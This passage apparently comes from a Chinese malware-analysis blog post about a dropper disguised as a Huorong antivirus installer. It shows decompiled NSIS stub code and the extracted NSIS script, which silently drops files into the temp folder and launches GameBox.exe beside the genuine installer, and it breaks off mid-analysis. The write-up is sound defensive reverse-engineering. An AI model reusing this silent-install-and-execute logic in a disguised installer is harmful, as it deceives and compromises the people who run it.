class="string">&#x27;tfos&#x27;</span></span><br><span class="line">          &amp;&amp; v12[<span class="number">2</span>] == <span class="string">&#x27;lluN&#x27;</span> )                 <span class="comment">// DEADBEEF NullsoftInst 这是NSIS stub payload</span></span><br><span class="line">        &#123;</span><br><span class="line">          Buffer |= v12[<span class="number">0</span>];</span><br><span class="line">          dword_4347A0 |= Buffer &amp; <span class="number">2</span>;</span><br><span class="line">          payload_start = lDistanceToMove;      <span class="comment">// 记录payload起始位置</span></span><br><span class="line">          <span class="keyword">if</span> ( v14 &gt; v3 )</span><br><span class="line">            <span class="keyword">return</span> aInstallerInteg;</span><br><span class="line">          <span class="keyword">if</span> ( (Buffer &amp; <span class="number">8</span>) == <span class="number">0</span> &amp;&amp; (Buffer &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">          ++v16;</span><br><span class="line">          v3 = v14 - <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v4 &gt; v14 - <span class="number">4</span> )</span><br><span class="line">            v4 = v14 - <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &lt; dw_FileSize )</span><br><span class="line">        v15 = func_Check(v15, byte_416A20, v4);</span><br><span class="line">      lDistanceToMove += v4;</span><br><span class="line">      v3 -= v4;</span><br><span class="line">      <span class="keyword">if</span> ( !v3 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+<p>在010Editor中，也找到了对应的stub：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_010NSISstub.png"
+                      alt="2026-5-2_010NSISstub"
+                ><br>在函数中，可以看到，在寻找到stub之后，就开始申请内存：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_Globalalloc.png"
+                      alt="2026-5-2_Globalalloc"
+                ><br>其中，在<code>sub_403314</code>函数中，就是读取，解压逻辑。如果后续有需要，可以详细分析（如果需要手动解压的话），如果不需要手动解压，可以动态调试直接dump解压后的code。<br>随后，程序调用<code>sub_403C84</code>函数，进入真正逻辑，而且执行完该函数之后，直接跳转到最后的推出部分，所以该函数是我们分析的重中之重。</p>
+<h2 id="3-安装程序-payload执行（sub-403C84）"><a href="#3-安装程序-payload执行（sub-403C84）" class="headerlink" title="3.安装程序&#x2F;payload执行（sub_403C84）"></a>3.安装程序&#x2F;payload执行（sub_403C84）</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">INT_PTR <span class="title function_">sub_403C84</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> *payload_0; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> (*ProcAddressByIndex)(<span class="type">void</span>); <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v2; <span class="comment">// ax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  WCHAR *v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">const</span> WCHAR *v5; <span class="comment">// eax</span></span><br><span class="line">  DWORD FileAttributesW; <span class="comment">// eax</span></span><br><span class="line">  WCHAR *v7; <span class="comment">// eax</span></span><br><span class="line">  HICON ImageW; <span class="comment">// eax</span></span><br><span class="line">  INT_PTR v10; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+0h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> pvParam; <span class="comment">// [esp+10h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> Y; <span class="comment">// [esp+14h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  payload_0 = (<span class="type">int</span> *)mem_payload;</span><br><span class="line">  ProcAddressByIndex = func_GetProcAddressByIndex(<span class="number">2</span>);<span class="comment">// GetDiskFreeSpaceExW</span></span><br><span class="line">  <span class="keyword">if</span> ( ProcAddressByIndex )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = ProcAddressByIndex();                  <span class="comment">// 检索有关磁盘卷上可用空间量的信息</span></span><br><span class="line">    func_wsprintfW_d(&amp;dw_fingerprint, v2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    wcscpy(&amp;dw_fingerprint, <span class="string">L&quot;0x&quot;</span>);</span><br><span class="line">    func_ReadRegesiter(<span class="number">0x80000001</span>, <span class="string">L&quot;Control Panel\\Desktop\\ResourceLocale&quot;</span>, <span class="number">0</span>, (LPBYTE)Data, <span class="number">0</span>);<span class="comment">// RegQueryValueExW\RegCloseKey</span></span><br><span class="line">    <span class="keyword">if</span> ( !Data[<span class="number">0</span>] )</span><br><span class="line">      func_ReadRegesiter(<span class="number">0x80000003</span>, (<span class="type">const</span> WCHAR *)&amp;off_408340, <span class="string">L&quot;Locale&quot;</span>, (LPBYTE)Data, <span class="number">0</span>);</span><br><span class="line">    lstrcatW(&amp;dw_fingerprint, Data);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_403F5A();</span><br><span class="line">  dword_434780[<span class="number">0</span>] = mem_payload_0 &amp; <span class="number">0x20</span>;</span><br><span class="line">  dword_43479C = <span class="number">0x10000</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !sub_405F89(&amp;word_43F800) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = payload_0[<span class="number">18</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = &amp;Buffer;</span><br><span class="line">      func_ReadRegesiter(</span><br><span class="line">        payload_0[<span class="number">17</span>],</span><br><span class="line">        (<span class="type">const</span> WCHAR *)off_434738 + v3,</span><br><span class="line">        (LPCWSTR)off_434738 + payload_0[<span class="number">19</span>],</span><br><span class="line">        (LPBYTE)&amp;Buffer,</span><br><span class="line">        <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( Buffer )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( Buffer == <span class="string">&#x27;&quot;&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 = &amp;word_4326A2;</span><br><span class="line">          *sub_405EAE(&amp;word_4326A2, <span class="number">34</span>) = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v5 = &amp;v4[lstrlenW(v4) - <span class="number">4</span>];</span><br><span class="line">        <span class="keyword">if</span> ( v5 &gt; v4 &amp;&amp; !lstrcmpiW(v5, aExe) )</span><br><span class="line">        &#123;</span><br><span class="line">          FileAttributesW = GetFileAttributesW(v4);</span><br><span class="line">          <span class="keyword">if</span> ( FileAttributesW == <span class="number">-1</span> || (FileAttributesW &amp; <span class="number">0x10</span>) == <span class="number">0</span> )</span><br><span class="line">            sub_405ECD(v4);</span><br><span class="line">        &#125;</span><br><span class="line">        v7 = sub_405E81(v4);</span><br><span class="line">        lstrcpynW_1024(&amp;word_43F800, v7, v11);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !sub_405F89(&amp;word_43F800) )</span><br><span class="line">    NISI_VM(<span class="number">0</span>, &amp;word_43F800, payload_0[<span class="number">70</span>]);</span><br><span class="line">  ImageW = (HICON)LoadImageW(hInst, (LPCWSTR)<span class="number">0x67</span>, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x8040u</span>);</span><br><span class="line">  dwNewLong = (LONG)ImageW;</span><br><span class="line">  <span class="keyword">if</span> ( payload_0[<span class="number">20</span>] != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    WndClass.lpfnWndProc = sub_401000;</span><br><span class="line">    WndClass.hInstance = hInst;</span><br><span class="line">    WndClass.hIcon = ImageW;</span><br><span class="line">    WndClass.lpszClassName = ClassName;</span><br><span class="line">    <span class="keyword">if</span> ( !RegisterClassW(&amp;WndClass) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    SystemParametersInfoW(<span class="number">0x30u</span>, <span class="number">0</span>, &amp;pvParam, <span class="number">0</span>);</span><br><span class="line">    dword_42CA48 = CreateWindowExW(<span class="number">0x80u</span>, ClassName, <span class="number">0</span>, <span class="number">0x80000000</span>, pvParam, Y, v14 - pvParam, v15 - Y, <span class="number">0</span>, <span class="number">0</span>, hInst, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( sub_40140B(<span class="number">0</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  sub_403F5A();</span><br><span class="line">  <span class="keyword">if</span> ( dword_4347A0 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( StartAddress(<span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !dword_4336CC )</span><br><span class="line">        sub_40140B(<span class="number">2</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_40140B(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ShowWindow(dword_42CA48, <span class="number">5</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !Load_Library((<span class="type">int</span>)<span class="string">&quot;RichEd20&quot;</span>) )</span><br><span class="line">    Load_Library((<span class="type">int</span>)<span class="string">&quot;RichEd32&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !GetClassInfoW(<span class="number">0</span>, <span class="string">L&quot;RichEdit20W&quot;</span>, &amp;WndClass) )</span><br><span class="line">  &#123;</span><br><span class="line">    GetClassInfoW(<span class="number">0</span>, <span class="string">L&quot;RichEdit&quot;</span>, &amp;WndClass);</span><br><span class="line">    WndClass.lpszClassName = <span class="string">L&quot;RichEdit20W&quot;</span>;</span><br><span class="line">    RegisterClassW(&amp;WndClass);</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = DialogBoxParamW(hInst, (LPCWSTR)(<span class="type">unsigned</span> __int16)(dword_4336E0 + <span class="number">105</span>), <span class="number">0</span>, sub_404032, <span class="number">0</span>);</span><br><span class="line">  sub_40140B(<span class="number">5</span>);</span><br><span class="line">  sub_403BD4(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>在这里，包含了寻找Install文件路径，注册窗口，执行安装程序窗口，另外，经过详细分析<code>StartAddress</code>就是payload的执行入口，但这个指令系统较为复杂：</p>
+<h2 id="sub-40140B"><a href="#sub-40140B" class="headerlink" title="sub_40140B"></a>sub_40140B</h2><p>该函数较为简单，首先看一下其参数，有0、1、2、5，猜测应该是12345都有的：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_sub40140b.png"
+                      alt="2026-5-2_sub40140b"
+                ><br>分析其内部实现：</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">sub_40140B</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> func_NSIS_VM(*(_DWORD *)(mem_payload + <span class="number">4</span> * a1 + <span class="number">108</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>其就是调用了<code>func_NSIS_VM</code>函数（这是一个类似于虚拟指令&#x3D;&#x3D;执行器&#x3D;&#x3D;），这里是做了一个函数转发，传入<code>func_NSIS_VM</code>的参数为：我们之前加压后的payload+4*a1+108。</p>
+<h2 id="func-NSIS-VM"><a href="#func-NSIS-VM" class="headerlink" title="func_NSIS_VM"></a>func_NSIS_VM</h2><p>这里实际上就是在循环执行指令了：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_NSIS_VM.png"
+                      alt="2026-5-2_NSIS_VM"
+                ><br>根据传进来的索引，从off_434730这张表上拿到索引，然后再传入<code>NSIS_Install_VM</code>（这里就是解释器了，也是根据索引真正执行指令的地方了）。<br>这里先把<code>off_434730</code>dump下来：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_off_434730.png"
+                      alt="2026-5-2_off_434730"
+                ><br>猜测可能有好几张表（只是猜测，结合前面传入的参数有12345）。</p>
+<h2 id="4-NSIS指令提取分析"><a href="#4-NSIS指令提取分析" class="headerlink" title="4.NSIS指令提取分析"></a>4.NSIS指令提取分析</h2><p>本来想着写解压脚本，结合几个数组，把虚拟指令还原成函数调用流，想到既然是NSIS打包的，那网上看看有没有人逆向过，结果发现，利用7z特定版本可以直接解压出来，<a class="link"   target="_blank" rel="noopener" href="https://linux.do/t/topic/317689" >下载地址<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_7z.png"
+                      alt="2026-5-2_7z"
+                ><br>解压出来之后，分析一下该nsi脚本：</p>
+<div class="code-container" data-rel="Nsis"><figure class="iseeu highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; NSIS script (UTF-8) NSIS-3 Unicode</span></span><br><span class="line"><span class="comment">; Install</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Unicode</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">SetCompressor</span> <span class="literal">zlib</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; --------------------</span></span><br><span class="line"><span class="comment">; HEADER SIZE: 4452</span></span><br><span class="line"><span class="comment">; START HEADER SIZE: 300</span></span><br><span class="line"><span class="comment">; MAX STRING LENGTH: 1024</span></span><br><span class="line"><span class="comment">; STRING CHARS: 763</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">OutFile</span> [NSIS].exe</span><br><span class="line"><span class="keyword">!include</span> WinMessages.nsh</span><br><span class="line"></span><br><span class="line"><span class="keyword">SilentInstall</span> <span class="literal">silent</span></span><br><span class="line"><span class="keyword">InstallDirRegKey</span> <span class="params">HKLM</span> Software\<span class="variable">$$&#123;APP_NAME&#125;</span> <span class="keyword">InstallDir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">; --------------------</span></span><br><span class="line"><span class="comment">; LANG TABLES: 1</span></span><br><span class="line"><span class="comment">; LANG STRINGS: 38</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Name</span> MyApp</span><br><span class="line"><span class="keyword">BrandingText</span> <span class="string">&quot;MyApp Installer&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; LANG: 1033</span></span><br><span class="line"><span class="keyword">LangString</span> LSTR_0 <span class="number">1033</span> <span class="string">&quot;MyApp Installer&quot;</span></span><br><span class="line"><span class="keyword">LangString</span> LSTR_1 <span class="number">1033</span> <span class="string">&quot;<span class="variable">$(LSTR_2)</span> Setup&quot;</span></span><br><span class="line"><span class="keyword">LangString</span> LSTR_2 <span class="number">1033</span> MyApp</span><br><span class="line"><span class="keyword">LangString</span> LSTR_5 <span class="number">1033</span> <span class="string">&quot;Can&#x27;t write: &quot;</span></span><br><span class="line"><span class="keyword">LangString</span> LSTR_10 <span class="number">1033</span> <span class="string">&quot;Create folder: &quot;</span></span><br><span class="line"><span class="keyword">LangString</span> LSTR_17 <span class="number">1033</span> <span class="string">&quot;Error decompressing data! Corrupted installer?&quot;</span></span><br><span class="line"><span class="keyword">LangString</span> LSTR_19 <span class="number">1033</span> <span class="string">&quot;ExecShell: &quot;</span></span><br><span class="line"><span class="keyword">LangString</span> LSTR_21 <span class="number">1033</span> <span class="string">&quot;Extract: &quot;</span></span><br><span class="line"><span class="keyword">LangString</span> LSTR_22 <span class="number">1033</span> <span class="string">&quot;Extract: error writing to file &quot;</span></span><br><span class="line"><span class="keyword">LangString</span> LSTR_25 <span class="number">1033</span> <span class="string">&quot;Output folder: &quot;</span></span><br><span class="line"><span class="keyword">LangString</span> LSTR_29 <span class="number">1033</span> <span class="string">&quot;Skipped: &quot;</span></span><br><span class="line"><span class="keyword">LangString</span> LSTR_30 <span class="number">1033</span> <span class="string">&quot;Copy Details To Clipboard&quot;</span></span><br><span class="line"><span class="keyword">LangString</span> LSTR_36 <span class="number">1033</span> <span class="string">&quot;Error opening file for writing: <span class="char escape_">$\r</span><span class="char escape_">$\n</span><span class="char escape_">$\r</span><span class="char escape_">$\n</span><span class="variable">$0</span><span class="char escape_">$\r</span><span class="char escape_">$\n</span><span class="char escape_">$\r</span><span class="char escape_">$\n</span>Click Abort to stop the installation,<span class="char escape_">$\r</span><span class="char escape_">$\n</span>Retry to try again, or<span class="char escape_">$\r</span><span class="char escape_">$\n</span>Ignore to skip this file.&quot;</span></span><br><span class="line"><span class="keyword">LangString</span> LSTR_37 <span class="number">1033</span> <span class="literal">Custom</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">; --------------------</span></span><br><span class="line"><span class="comment">; VARIABLES: 13</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Var</span> _0_</span><br><span class="line"><span class="keyword">Var</span> _1_</span><br><span class="line"><span class="keyword">Var</span> _2_</span><br><span class="line"><span class="keyword">Var</span> _3_</span><br><span class="line"><span class="keyword">Var</span> _4_</span><br><span class="line"><span class="keyword">Var</span> _5_</span><br><span class="line"><span class="keyword">Var</span> _6_</span><br><span class="line"><span class="keyword">Var</span> _7_</span><br><span class="line"><span class="keyword">Var</span> _8_</span><br><span class="line"><span class="keyword">Var</span> _9_</span><br><span class="line"><span class="keyword">Var</span> _10_</span><br><span class="line"><span class="keyword">Var</span> _11_</span><br><span class="line"><span class="keyword">Var</span> _12_</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">InstType</span> <span class="variable">$(LSTR_37)</span>    <span class="comment">;  Custom</span></span><br><span class="line"><span class="keyword">InstallDir</span> <span class="variable">$PROGRAMFILES</span>\MyApp</span><br><span class="line"><span class="comment">; install_directory_auto_append = MyApp</span></span><br><span class="line"><span class="comment">; wininit = $WINDIR\wininit.ini</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">; --------------------</span></span><br><span class="line"><span class="comment">; SECTIONS: 1</span></span><br><span class="line"><span class="comment">; COMMANDS: 14</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Section</span> <span class="string">&quot;Main Section&quot;</span> <span class="comment">; Section_0</span></span><br><span class="line">  <span class="comment">; AddSize 144313</span></span><br><span class="line">  <span class="keyword">StrCpy</span> <span class="variable">$_12_</span> <span class="variable">$TEMP</span>\MyApp</span><br><span class="line">  <span class="keyword">CreateDirectory</span> <span class="variable">$_12_</span></span><br><span class="line">  <span class="keyword">SetOutPath</span> <span class="variable">$_12_</span></span><br><span class="line">  <span class="keyword">File</span> avcodec-<span class="number">58</span>.dll</span><br><span class="line">  <span class="keyword">File</span> dnresource.rcc</span><br><span class="line">  <span class="keyword">File</span> DuiLib_u.dll</span><br><span class="line">  <span class="keyword">File</span> finalshell.jar</span><br><span class="line">  <span class="keyword">File</span> GameBox.exe</span><br><span class="line">  <span class="keyword">File</span> sysdiag-<span class="literal">all</span>-x64-<span class="number">6.0</span>.<span class="number">8.5</span>-<span class="number">2026.01</span>.<span class="number">11.1</span>.exe</span><br><span class="line">  <span class="keyword">File</span> <span class="literal">user</span>.dat</span><br><span class="line">  <span class="keyword">File</span> Utility.dll</span><br><span class="line">  <span class="keyword">ExecShell</span> <span class="literal">open</span> <span class="variable">$_12_</span>\GameBox.exe    <span class="comment">; &quot;open $_12_\GameBox.exe&quot;</span></span><br><span class="line">  <span class="keyword">ExecShell</span> <span class="literal">open</span> <span class="variable">$_12_</span>\sysdiag-<span class="literal">all</span>-x64-<span class="number">6.0</span>.<span class="number">8.5</span>-<span class="number">2026.01</span>.<span class="number">11.1</span>.exe    <span class="comment">; &quot;open $_12_\sysdiag-all-x64-6.0.8.5-2026.01.11.1.exe&quot;</span></span><br><span class="line"><span class="keyword">SectionEnd</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">; --------------------</span></span><br><span class="line"><span class="comment">; UNREFERENCED STRINGS:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">17 CommonFilesDir</span></span><br><span class="line"><span class="comment">49 $PROGRAMFILES</span></span><br><span class="line"><span class="comment">52 &quot;$PROGRAMFILES\Common Files&quot;</span></span><br><span class="line"><span class="comment">68 $COMMONFILES</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>这里还原一下流程：</p>
+<div class="code-container" data-rel="Nsis"><figure class="iseeu highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SilentInstall</span> <span class="literal">silent</span></span><br><span class="line"><span class="keyword">OutFile</span> [NSIS].exe</span><br><span class="line"><span class="keyword">InstallDir</span> <span class="variable">$PROGRAMFILES</span>\MyApp</span><br></pre></td></tr></table></figure></div>
+<p>静默安装，输出文件名为<code>[NSIS.exe]</code>。</p>
+<div class="code-container" data-rel="Nsis"><figure class="iseeu highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">StrCpy</span> <span class="variable">$_12_</span> <span class="variable">$TEMP</span>\MyApp</span><br><span class="line"><span class="keyword">CreateDirectory</span> <span class="variable">$_12_</span></span><br><span class="line"><span class="keyword">SetOutPath</span> <span class="variable">$_12_</span></span><br></pre></td></tr></table></figure></div>
+<p>安装路径为<code>%temp%/MyApp</code>。</p>
+<div class="code-container" data-rel="Nsis"><figure class="iseeu highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">File</span> avcodec-<span class="number">58</span>.dll</span><br><span class="line"><span class="keyword">File</span> dnresource.rcc</span><br><span class="line"><span class="keyword">File</span> DuiLib_u.dll</span><br><span class="line"><span class="keyword">File</span> finalshell.jar</span><br><span class="line"><span class="keyword">File</span> GameBox.exe</span><br><span class="line"><span class="keyword">File</span> sysdiag-<span class="literal">all</span>-x64-<span class="number">6.0</span>.<span class="number">8.5</span>-<span class="number">2026.01</span>.<span class="number">11.1</span>.exe</span><br><span class="line"><span class="keyword">File</span> <span class="literal">user</span>.dat</span><br><span class="line"><span class="keyword">File</span> Utility.dll</span><br></pre></td></tr></table></figure></div>
+<p>所有投放文件。</p>
+<div class="code-container" data-rel="Nsis"><figure class="iseeu highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ExecShell</span> <span class="literal">open</span> <span class="variable">$_12_</span>\GameBox.exe</span><br><span class="line"><span class="keyword">ExecShell</span> <span class="literal">open</span> <span class="variable">$_12_</span>\sysdiag...</span><br></pre></td></tr></table></figure></div>
+<p>这里是执行逻辑，可以看到同时执行了两个exe。</p>
+<h2 id="5-释放文件分析"><a href="#5-释放文件分析" class="headerlink" title="5.释放文件分析"></a>5.释放文件分析</h2><p>首先，查看其所有文件：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_AllFile.png"
+                      alt="2026-5-2_AllFile"
+                ><br>前文提到，该样本伪装成了火绒安装器，这里启动的<code>sysdiag-all-x64-6.0.8.5-2026.01.11.1.exe</code>便是火绒官方的安装器，其附带签名：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_sysdiag.png"
+                      alt="2026-5-2_sysdiag"
+                ><br>另外启动的是GameBox，这个也是带签名的官方应用程序：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_GameBox.png"
+                      alt="2026-5-2_GameBox"
